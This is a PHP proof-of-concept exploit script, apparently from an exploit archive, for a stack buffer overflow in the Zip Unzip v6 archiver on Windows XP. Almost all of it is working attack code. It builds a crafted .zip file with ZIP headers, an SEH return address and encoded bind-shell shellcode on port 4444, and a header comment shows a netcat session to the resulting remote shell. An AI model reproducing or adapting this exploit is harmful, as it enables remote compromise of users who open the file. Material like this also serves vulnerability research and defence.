<?php
/*
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Zip Unzip v6 (.zip) 0day stack buffer overflow PoC exploit
Author: mr_me - http://net-ninja.net/
Download: http://www.microviet.com/modules/freesoftware/
Platform: Windows XP sp3
Greetz to: Corelan Security Team & fl0 fl0w
http://www.corelan.be:8800/index.php/security/corelan-team-members/
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Script provided 'as is', without any warranty.
Use for educational purposes only.
Do not use this code to do anything illegal !
 
Note : you are not allowed to edit/modify this code.
If you do, Corelan cannot be held responsible for any damages this may cause.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Sorry, not universal.. any ppr from the target application uses 0x01 which
kills our ascii buffer. ..Enjoy.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
mrme@backtrack:~$ nc -v 192.168.1.3 4444
192.168.1.3: inverse host lookup failed: Unknown server error : Connection timed out
(UNKNOWN) [192.168.1.3] 4444 (?) open
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.
 
G:\0day\zip0day>
*/
 
// local file header
$lf_header = "\x50\x4B\x03\x04\x14\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\xe4\x0f\x00\x00\x00";
 
// central directory file header
$cdf_header = "\x50\x4B\x01\x02\x14\x00\x14\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe4\x0f\x00\x00\x00\x00\x00\x00\x01\x00".
"\x24\x00\x00\x00\x00\x00\x00\x00";
 
// end of central directory record
$efcdr_record = "\x50\x4B\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00".
"\x12\x10\x00\x00\x02\x10\x00\x00\x00\x00";
 
// bind shell on port 4444, edx as base reg
$______sc = "JJJJJJJJJJJJJJJJJ7RYjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJI8kWssixkDExhZXkOyoKO0OaYri".
"aY3yQYW9rqQJPV3d68efEcfPPVpXDtQQTpQRUfRhw8dpQRTsFPw2QSpV3hUb0Bw4QR0H4tqQP2QQ2d4paQctR".
"tQRqTRqsr6PqQw4SqpVpX4tRz4xsrbd0JPOpMpNRobldvbkrnPOrdPJPN1Y0OBopOroPOpO2oQRpVPK0XBnsf".
"qVp2rf4rpKVXqUstRnssBkShBn1W0ErpaZCgRapPpOpNrkwH0OdtPJg1RkpXPOpUsrRr1QTprk2n1SPNg2Bss".
"yRtPKTxQVQC0KPXG1tpV0RnraUcQRBlG9VYRnrjrfv8crpL3vpWQWp0cqPLpL0LpMPP1QvPRdRl2kpNcvPORk".
"WCSvpUg6CrqZqRcuPWSsbn0K1HboPUSvpRsqrpBkPNW8tvPKv82npPpKEd0K0HpO3eBnSqqQVP0KPNPCdpPNp".
"RrkW8RivXPNtvpFW2RncqqQSfSspLQQ2cg2rlsv2fpK2hqRcdCr7CpKpXW2aT2npPrkVX3raWRnra0MpJPK2h".
"72Cd1Z2p60Ue3zW6V0V8bpW4RppPrnrnSrDuRoPO1XPMsqrspKPM0HufpCseQXPVCzFVrcucRdP3pJf6QWbg7".
"3PGstP3PO0U1V65ro2opBRmQZrvbkpLbmRnpNRoPKpSW2aUPOBo78bmPOvUcyaX75PNrhrv3qw8rmpN3zBpW4".
"TpsupUpLPFCtRpRopOQRrmszvVSypMRiPPQUpO0MszW71ERoBoqXPMSsW52cPEQSpUSspUQSbessfTw3RebcU".
"dssTu2o2o1R2m1XrvPJ66QQCqPNvUCxp6ssp5rivXCq0Nw5RipJQVPFQZ2lPQW2v777pLswburoroQXpMpLP6".
"SrUaqQReg57EbopOaRPMpJtvCvpJPMrjBpw2cypNPG2upOBoqXpMPCwEpE5eRoRoqRPMpJP6w50Nri0DQXehq".
"YpT1WRupObo78PM2bbu3veesvReG5duPOpO1RbmQSg90J2vcwrn1YVW2hrlg9GGW7RePOpOBh0MG52uRoRo1R".
"2mW8EfpLPV0FaVpHwFaZcvcspVPMBvw9P8pEPNblpV2bqEQYseG9pRrnblSy2hw7PNRl5fCvRtw9V8qTPNsqp".
"CaRPLg3POPLqZ2ppOpDRt2mdrBpPO3tBt2nSbrc1YpMshpL1WPJpS0KpJ0KpJ0KSzczSvQTaG0P0ObcpKBhpQ".
"PORoqUF72fRtbopOCx0MpKcug7fUSt6U3qwESqQEqQuepLBfrapPqQFUbaSuSuVUaQQUbo0O1RrmQZ2v0MRj2".
"iBmaUTpf0PLPCvUpORoaX0Mrlv6roPOroBo0GFSRoro2bRmRkChcwg5PN0OSsVX0FPLsvefPOro3xpMrdRupO".
"pOSrbm3z4vPOrn60PLpB2n3rUfSs2u0OroQXPMPO0OqRRm2zA";
 
$___offset = 4064;
$___exploit = str_repeat("\x41",39).
"\x73\x07\x41\x41".
"\x76\x50\x47\x73".                     // 0x73475076 [msvbvm60.dll]
str_repeat("\x61",32).
str_repeat("\x5a",2).
str_repeat("\x43",510).
$______sc;
$___exploit .=
str_repeat("\x43",$___offset-strlen($___exploit)).
"\x2e\x74\x78\x74";
$_____b00m = $lf_header.$___exploit.$cdf_header.$___exploit.$efcdr_record;
file_put_contents("cst-zipunzip.zip",$_____b00m);
?>
